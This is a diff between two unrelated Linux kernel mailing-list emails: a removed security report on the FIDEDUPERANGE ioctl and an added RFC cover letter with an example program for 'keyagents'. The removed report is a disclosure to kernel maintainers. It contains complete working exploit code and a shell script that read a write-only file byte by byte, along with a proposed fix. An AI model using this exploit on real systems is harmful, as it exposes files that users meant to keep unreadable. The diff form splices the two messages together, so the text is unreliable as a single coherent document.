@@ -2,51 +2,57 @@ Return-Path: <linux-fsdevel-owner@vger.kernel.org>
 X-Original-To: lists+linux-fsdevel@lfdr.de
 Delivered-To: lists+linux-fsdevel@lfdr.de
 Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
-	by mail.lfdr.de (Postfix) with ESMTP id 2CC6F5719B7
-	for <lists+linux-fsdevel@lfdr.de>; Tue, 12 Jul 2022 14:18:18 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id 440E2571A1E
+	for <lists+linux-fsdevel@lfdr.de>; Tue, 12 Jul 2022 14:35:53 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S229729AbiGLMSQ (ORCPT <rfc822;lists+linux-fsdevel@lfdr.de>);
-        Tue, 12 Jul 2022 08:18:16 -0400
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:36338 "EHLO
+        id S232683AbiGLMfg (ORCPT <rfc822;lists+linux-fsdevel@lfdr.de>);
+        Tue, 12 Jul 2022 08:35:36 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:52376 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S229572AbiGLMSP (ORCPT
+        with ESMTP id S233153AbiGLMf3 (ORCPT
         <rfc822;linux-fsdevel@vger.kernel.org>);
-        Tue, 12 Jul 2022 08:18:15 -0400
-X-Greylist: delayed 402 seconds by postgrey-1.37 at lindbergh.monkeyblade.net; Tue, 12 Jul 2022 05:18:13 PDT
-Received: from mail-relay230.hrz.tu-darmstadt.de (mail-relay230.hrz.tu-darmstadt.de [130.83.156.230])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 39A754D4C0
-        for <linux-fsdevel@vger.kernel.org>; Tue, 12 Jul 2022 05:18:13 -0700 (PDT)
-Received: from smtp.tu-darmstadt.de (mail-relay158.hrz.tu-darmstadt.de [IPv6:2001:41b8:83f:1611::158])
-        (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
-         key-exchange X25519 server-signature RSA-PSS (4096 bits)
-         client-signature RSA-PSS (4096 bits))
-        (Client CN "mail-relay158.hrz.tu-darmstadt.de", Issuer "DFN-Verein Global Issuing CA" (not verified))
-        by mail-relay230.hrz.tu-darmstadt.de (Postfix) with ESMTPS id 4Lj03L1JMBz43qr;
-        Tue, 12 Jul 2022 14:11:26 +0200 (CEST)
-Received: from [IPV6:2001:41b8:810:20:3da5:807c:fa4d:1353] (unknown [IPv6:2001:41b8:810:20:3da5:807c:fa4d:1353])
-        (using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
-         key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
-        (Client did not present a certificate)
-        by smtp.tu-darmstadt.de (Postfix) with ESMTPSA id 4Lj03J5lfQz43Vh;
-        Tue, 12 Jul 2022 14:11:24 +0200 (CEST)
-Message-ID: <a7c93559-4ba1-df2f-7a85-55a143696405@tu-darmstadt.de>
-Date:   Tue, 12 Jul 2022 14:11:24 +0200
+        Tue, 12 Jul 2022 08:35:29 -0400
+Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.133.124])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTP id A815F2CE3A
+        for <linux-fsdevel@vger.kernel.org>; Tue, 12 Jul 2022 05:35:26 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
+        s=mimecast20190719; t=1657629325;
+        h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+         to:to:cc:cc:mime-version:mime-version:
+         content-transfer-encoding:content-transfer-encoding;
+        bh=ZRNqvwEkQjWUz9SudAZmar3Unjg5boMD/ciY51IuWI8=;
+        b=SEeeuV8wim7wWiNWiHG98g757EVKnVALewc6PYZhuU4rj2z6W4GZ1myeMphAuHBF+ERxga
+        tDJPPyalHE7N6VTdlmLNdC3+o2gTjJ3rmluiPJ2QOp24lWTpt5ItF7QQWIfquTn7D+oyqJ
+        2aZ83O4KqtYoAOvOmHBUq37bkyFAgAc=
+Received: from mimecast-mx02.redhat.com (mx3-rdu2.redhat.com
+ [66.187.233.73]) by relay.mimecast.com with ESMTP with STARTTLS
+ (version=TLSv1.2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ us-mta-454-Fr7dWCPbPbS7hKwO1fVVSw-1; Tue, 12 Jul 2022 08:35:22 -0400
+X-MC-Unique: Fr7dWCPbPbS7hKwO1fVVSw-1
+Received: from smtp.corp.redhat.com (int-mx04.intmail.prod.int.rdu2.redhat.com [10.11.54.4])
+        (using TLSv1.2 with cipher AECDH-AES256-SHA (256/256 bits))
+        (No client certificate requested)
+        by mimecast-mx02.redhat.com (Postfix) with ESMTPS id 0FAF02919EBB;
+        Tue, 12 Jul 2022 12:35:22 +0000 (UTC)
+Received: from bcodding.csb (unknown [10.22.48.8])
+        by smtp.corp.redhat.com (Postfix) with ESMTP id CDAE82026D64;
+        Tue, 12 Jul 2022 12:35:21 +0000 (UTC)
+Received: by bcodding.csb (Postfix, from userid 24008)
+        id 50C4A10C30E0; Tue, 12 Jul 2022 08:35:21 -0400 (EDT)
+From:   Benjamin Coddington <bcodding@redhat.com>
+To:     David Howells <dhowells@redhat.com>, linux-kernel@vger.kernel.org
+Cc:     ebiederm@xmission.com, Ian Kent <raven@themaw.net>,
+        Trond Myklebust <trond.myklebust@hammerspace.com>,
+        linux-nfs@vger.kernel.org, linux-fsdevel@vger.kernel.org
+Subject: [RFC PATCH 0/2] Keyagents: another call_usermodehelper approach for namespaces
+Date:   Tue, 12 Jul 2022 08:35:19 -0400
+Message-Id: <cover.1657624639.git.bcodding@redhat.com>
 MIME-Version: 1.0
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101
- Thunderbird/91.11.0
-Reply-To: ansgar.loesser@kom.tu-darmstadt.de
-To:     viro@zeniv.linux.org.uk, linux-fsdevel@vger.kernel.org,
-        security@kernel.org
-Cc:     Max Schlecht <max.schlecht@informatik.hu-berlin.de>,
-        =?UTF-8?Q?Bj=c3=b6rn_Scheuermann?= 
-        <scheuermann@kom.tu-darmstadt.de>
-From:   =?UTF-8?B?QW5zZ2FyIEzDtsOfZXI=?= <ansgar.loesser@tu-darmstadt.de>
-Subject: Information Leak: FIDEDUPERANGE ioctl allows reading writeonly files
-Content-Type: text/plain; charset=UTF-8; format=flowed
 Content-Transfer-Encoding: 8bit
-X-Header-TUDa: QAy2LZ/mv4rnYAEvPe+hus7WF+1CrvJz7aabIHs1iFrjIV8t9upBOqo34ARb9MadSSmj+PEe5/UATta0nI6QETluwPE+HivVYTLMO1
-X-Spam-Status: No, score=-4.2 required=5.0 tests=BAYES_00,RCVD_IN_DNSWL_MED,
-        SPF_HELO_NONE,SPF_NONE,T_SCC_BODY_TEXT_LINE autolearn=ham
+X-Scanned-By: MIMEDefang 2.78 on 10.11.54.4
+X-Spam-Status: No, score=-2.7 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
+        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,RCVD_IN_DNSWL_NONE,
+        SPF_HELO_NONE,SPF_NONE,T_SCC_BODY_TEXT_LINE autolearn=unavailable
         autolearn_force=no version=3.4.6
 X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
         lindbergh.monkeyblade.net
@@ -54,208 +60,215 @@ Precedence: bulk
 List-ID: <linux-fsdevel.vger.kernel.org>
 X-Mailing-List: linux-fsdevel@vger.kernel.org
 
-Dear Mr. Viro,
+A persistent unsolved problem exists: how can the kernel find and/or create
+the appropriate "container" within which to execute a userspace program to
+construct keys or satisfy users of call_usermodehelper()?
 
-using the deduplication API we found out, that the FIDEDUPERANGE ioctl 
-syscall can be used to read a writeonly file.
-A more formal description of the bug, an example code to exploit it and 
-a proposed solution are attatched below.
+I believe the latest serious attempt to solve this problem was David's "Make
+containers kernel objects":
+https://lore.kernel.org/lkml/149547014649.10599.12025037906646164347.stgit@warthog.procyon.org.uk/
 
-In case of open questions please do not hesitate to contact us.
+Over in NFS' space, we've most recently pondered this issue while looking at
+ways to pass a kernel socket to userspace in order to handle TLS events:
+https://lore.kernel.org/linux-nfs/E2BF9CFF-9361-400B-BDEE-CF5E0AFDCA63@redhat.com/
 
-With best regards,
-Ansgar Lößer
+The problem is that containers are not kernel objects, rather a collection
+of namespaces, cgroups, etc.  Attempts at making the kernel aware of
+containers have been mired in discussion and problems.  It has been
+suggested that the best representation of a "container" from the kernel's
+perspective is a process.
 
+Keyagents are processes represented by a key.  If a keyagent's key is linked
+to a session_keyring, it can be sent a realtime signal when a calling
+process requests a matching key_type.  That signal will dispatch the process
+to construct the desired key within the keyagent process context.  Keyagents
+are similar to ssh-agents.  To use a keyagent, one must execute a keyagent
+process in the desired context, and then link the keyagent's key onto other
+process' session_keyrings.
 
-FIDEDUPERANGE ioctl allows reading writeonly files
+This method of linking keyagent keys to session_keyrings can be used to
+construct the various mappings of callers to keyagents that containers may
+need.  A single keyagent process can answer request-key upcalls across
+container boundaries, or upcalls can be restricted to specific containers.
 
-The FIDEDUPERANGE ioctl can be used to read data from files that are 
-supposed
-to be writeonly on supported file systems (btrfs, xfs, ...).
+I'm aware that building on realtime signals may not be a popular choice, but
+using realtime signals makes this work simple and ensures delivery.  Realtime
+signals are able to convey everything needed to construct keys in userspace:
+the under-construction key's serial number.
 
-confirmed on 5.18.3 (amd64, debian)
-Reported-by: Ansgar Lößer (ansgar.loesser@kom.tu-darmstadt.de), Max Schlecht
-(max.schlecht@informatik.hu-berlin.de) and Björn Scheuermann
-(scheuermann@kom.tu-darmstadt.de)
+This work is not complete; it has security implications, it needs
+documentation, it has not been reviewed by anyone.  Thanks for reading this
+RFC.  I wish to collect criticism and validate this approach.
 
-The FIDEDUPERANGE ioctl is intended to be able to share physical storage for
-multiple data blocks across files that contain identical data, on the 
-same file
-system. To do so, the ioctl takes a `src_fd` and `dest_fd`, as well as 
-offset
-and  length parameters, specifying data ranges should be tried to be
-deduplicated. The ioctl then compares the contents of the data ranges and
-returns the number of bytes that have been deduplicated.
+Below the diffstat in this message is an example userspace program to answer
+keyagent requests for user keys. It can be compiled with:
+gcc -lkeyutils -o ka_simple ka_simple.c
 
-The issue is, that while `src_fd` has to be open for reading, `dest_fd` only
-has to be open for writing. Thus, multiple consecutive ioctl calls can 
-be used
-to read out the contents of `dest_fd`. This is done byte by byte, by trying
-different input data, until getting a successful deduplication, indicating
-equal content in the two data ranges. This technique works even if files are
-marked as `append only` in btrfs.
+Benjamin Coddington (2):
+  KEYS: Add key_type keyagent
+  KEYS: Add keyagent request_key
 
-The proposed fix is to change the required permissions, so that 
-`dest_fd` has
-to be open for reading as well.
-
-exploit code (`read_writeonly.c`)
-```C
-#define _XOPEN_SOURCE 500 // pwrite
-#include <linux/types.h>
-#include <linux/fs.h>
-#include <stdio.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <errno.h>
-#include <sys/ioctl.h>
-#include <assert.h>
-
-// use FIDEDUPERANGE ioctl to compare the target writeonly file (dest_fd)
-// with the test file (src_fd)
-int compare_fds(int src_fd, int dest_fd, __u64 offset, __u64 length)
-{
-     char buffer[sizeof(struct file_dedupe_range)
-         + sizeof(struct file_dedupe_range_info)];
-     struct file_dedupe_range* arg = (struct file_dedupe_range*)buffer;
-     arg->src_offset = 0;
-     arg->src_length = length;
-     arg->dest_count = 1;
-     arg->reserved1  = 0;
-     arg->reserved2  = 0;
-
-     struct file_dedupe_range_info* info = &arg->info[0];
-     info->dest_fd = dest_fd;
-     info->dest_offset = offset;
-     info->reserved = 0;
-
-     ioctl(src_fd, FIDEDUPERANGE, arg);
-     printf("%d_%llu ", info->status, info->bytes_deduped);
-
-     return info->status;
-}
-
-int main(int argc, char** argv)
-{
-     if (argc != 2)
-     {
-         fprintf(stderr, "./read_writeonly <filepath>\n");
-         return 0;
-     }
-
-     // open the target writeonly file
-     int target_fd = open(argv[1], O_WRONLY | O_APPEND);
-     if (target_fd == -1)
-     {
-         fprintf(stderr, "failed to open \"%s\" with %d\n", argv[1], errno);
-         return -1;
-     }
-
-     // create a test file to compare the target file with (via 
-deduplication)
-     int test_fd = open("test.tmp", O_RDWR | O_CREAT | O_TRUNC, 0777);
-     if (test_fd == -1)
-     {
-         close(target_fd);
-         fprintf(stderr, "fatal: failed to open test file with %d\n", 
-errno);
-         return -1;
-     }
-
-     __u64 file_offset = 0;
-     do
-     {
-         int status;
-         __u8 c;
-
-         for (__u16 i = 0; i < 256; i++)
-         {
-             c = (__u8)i;
-             __u64 offset = file_offset % 4096;
-             __u64 length = offset + 1;
-             __u64 block_offset = file_offset - offset;
-
-             if (offset == 0)
-             {
-                 ftruncate(test_fd, 0);
-             }
-
-             pwrite(test_fd, &c, 1, offset);
-             status = compare_fds(test_fd, target_fd, block_offset, length);
-
-             if (status == FILE_DEDUPE_RANGE_SAME || status < 0)
-             {
-                 break;
-             }
-         }
-         assert(status != FILE_DEDUPE_RANGE_DIFFERS);
-
-         if (status < 0)
-         {
-             break;
-         }
-
-         putc(c, stdout);
-
-         file_offset++;
-     } while (1);
-
-     close(target_fd);
-     close(test_fd);
-     unlink("test.tmp");
-
-     return 0;
-}
-```
-
-helper shell script (`test.sh`)
-```sh
-#!/bin/sh
-
-gcc read_writeonly.c -o read_writeonly
-
-# create writeonly file
-touch writeonly.txt
-chmod 220 writeonly.txt
-echo "secret" > writeonly.txt
-sudo chown 65535 writeonly.txt
-
-# read from writeonly file
-./read_writeonly writeonly.txt
-```
-
-proposed fix (read_writeonly.patch)
-```
-diff --git a/fs/remap_range.c b/fs/remap_range.c
-index e112b54..ad5b44d 100644
---- a/fs/remap_range.c
-+++ b/fs/remap_range.c
-@@ -414,11 +414,11 @@ static bool allow_file_dedupe(struct file *file)
-
-      if (capable(CAP_SYS_ADMIN))
-          return true;
--    if (file->f_mode & FMODE_WRITE)
-+    if ((file->f_mode & (FMODE_READ | FMODE_WRITE)) == (FMODE_READ | 
-FMODE_WRITE))
-          return true;
-      if (uid_eq(current_fsuid(), i_uid_into_mnt(mnt_userns, inode)))
-          return true;
--    if (!inode_permission(mnt_userns, inode, MAY_WRITE))
-+    if (!inode_permission(mnt_userns, inode, MAY_READ | MAY_WRITE))
-          return true;
-      return false;
-  }
-```
+ include/uapi/asm-generic/siginfo.h |   1 +
+ security/keys/Kconfig              |   9 ++
+ security/keys/Makefile             |   1 +
+ security/keys/internal.h           |   4 +
+ security/keys/keyagent.c           | 158 +++++++++++++++++++++++++++++
+ security/keys/request_key.c        |   9 ++
+ 6 files changed, 182 insertions(+)
+ create mode 100644 security/keys/keyagent.c
 
 -- 
-M.Sc. Ansgar Lößer
-Fachgebiet Kommunikationsnetze
-Fachbereich für Elektrotechnik und Informationstechnik
-Technische Universität Darmstadt
+// SPDX-License-Identifier: GPL-2.0-only
+/* ka_simple.c: userspace keyagent example
+ *
+ * Copyright (C) 2022 Red Hat Inc. All Rights Reserved.
+ * Written by Benjamin Coddington (bcodding@redhat.com)
+ *
+ * This programs registers a simple keyagent for user keys that will handle
+ * requests from the kernel keyagent, and instantiate keys that have
+ * callout_info == "test_callout_info".
+ */
+#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+#include <err.h>
+#include <errno.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <linux/types.h>
+#include <keyutils.h>
+#include <sys/signalfd.h>
 
-Rundeturmstraße 10
-64283 Darmstadt
+int ka_sig_fd = 0;
+key_serial_t ka_key_serial;
+__be16 ka_signal;
 
-E-Mail: ansgar.loesser@kom.tu-darmstadt.de
-http://www.kom.tu-darmstadt.de
+/* Setup a signalfd masked to SIGRTMIN + 1 */
+void ka_sig_setup()
+{
+	int ret;
+	sigset_t mask;
+
+	/* Which realtime signal are we using? */
+	ka_signal = SIGRTMIN + 1;
+
+	sigemptyset(&mask);
+	sigaddset(&mask, ka_signal);
+
+	ret = sigprocmask(SIG_BLOCK, &mask, NULL);
+	if (ret != 0)
+		err(ret, "rt_sigprocmask");
+
+	ka_sig_fd = signalfd(-1, &mask, 0);
+	if (ka_sig_fd == -1)
+		err(ret, "signalfd");
+}
+
+/* Register this process as a keyagent for user keys to be notified by
+ * signal number SIGRTMIN + 1 by creating a keyagent key with a description
+ * of "user", and payload of SIGRTMIN + 1 */
+void ka_register()
+{
+	printf("Registering as keyagent for user keys with signal %d\n", ka_signal);
+	/* The kernel will place authorization keys on our process keyring.
+	 * Make sure we have a process keyring: */
+	keyctl_get_keyring_ID(KEY_SPEC_PROCESS_KEYRING, 1);
+	ka_key_serial = add_key("keyagent", "user", &ka_signal, sizeof(unsigned int), KEY_SPEC_SESSION_KEYRING);
+
+	if (ka_key_serial == -1)
+		err(errno, "add_key");
+
+	/* Permissions for the keyagent's key: */
+	keyctl_setperm(ka_key_serial, KEY_USR_ALL);
+}
+
+/* Handle kernel request_key().  The serial number of the key is the int
+ * passed in the realtime signal */
+int ka_request_key(key_serial_t key) {
+	int ret, ntype, dpos, n;
+	char *buf_type_desc, *key_type, *key_desc;
+	void *callout;
+
+	printf("ka_request_key %d\n", key);
+
+	ret = keyctl_assume_authority(key);
+	if (ret < 0) {
+		warn("failed to assume authority over key %d (%m)\n", key);
+		goto out;
+	}
+
+	ret = keyctl_describe_alloc(key, &buf_type_desc);
+	if (ret < 0) {
+		warn("key %d inaccessible (%m)\n", key);
+		goto out;
+	}
+
+	printf("Key descriptor: \"%s\"\n", buf_type_desc);
+
+	/* Shamelessly copied from libkeyutils/request_key.c: */
+	ntype = -1;
+	dpos = -1;
+
+	n = sscanf(buf_type_desc, "%*[^;]%n;%*d;%*d;%x;%n", &ntype, &n, &dpos);
+	if (n != 1)
+		printf("Failed to parse key description\n");
+
+	key_type = buf_type_desc;
+	key_type[ntype] = 0;
+	key_desc = buf_type_desc + dpos;
+
+	ret = keyctl_read_alloc(KEY_SPEC_REQKEY_AUTH_KEY, &callout);
+	if (ret < 0) {
+		warn("failed to retrieve callout info (%m)\n");
+		goto out_free_type;
+	}
+
+	if (strcmp(buf_type_desc, "user") == 0 && strcmp(callout, "test_callout_info") == 0) {
+		keyctl_instantiate(key, "keyagent_payload", sizeof("keyagent_payload"), KEY_SPEC_SESSION_KEYRING);
+		printf("instantiated key %d with payload \"keyagent_payload\" on session keyring\n", key);
+	} else {
+		keyctl_reject(key, 10, EKEYREJECTED, KEY_SPEC_SESSION_KEYRING);
+		printf("this keyagent only instantiates user keys with callout \"test_callout_info\"\n");
+	}
+
+	/* De-assume the authority (for now) */	
+	ret = keyctl_assume_authority(0);
+	free(callout);
+	
+out_free_type:
+	free(buf_type_desc);
+out:
+	return ret;
+}
+
+/* Handle signals from our signalfd, dispatch ka_request_key() */
+int ka_process()
+{
+	struct signalfd_siginfo fdsi;
+	ssize_t size;
+
+	for (;;) {
+		size = read(ka_sig_fd, &fdsi, sizeof(struct signalfd_siginfo));
+		if (size != sizeof(struct signalfd_siginfo))
+			err(EINVAL, "reading signal_fd");
+
+		if (ka_request_key(fdsi.ssi_int))
+			break;
+	}
+}
+
+int main(int argc, char **argv)
+{
+	ka_sig_setup();
+	ka_register();
+
+	printf("Registered as keyagent with key %d\n", ka_key_serial);
+	printf("Subscribe to this keyagent by linking it into your session keyring with:\n\tkeyctl link %d @s\n", ka_key_serial);
+	printf("then, you can send a request to this agent with:\n\tkeyctl request2 user <description> \"test_callout_info\"\n");
+
+	ka_process();
+}
+
+--
+2.31.1
 
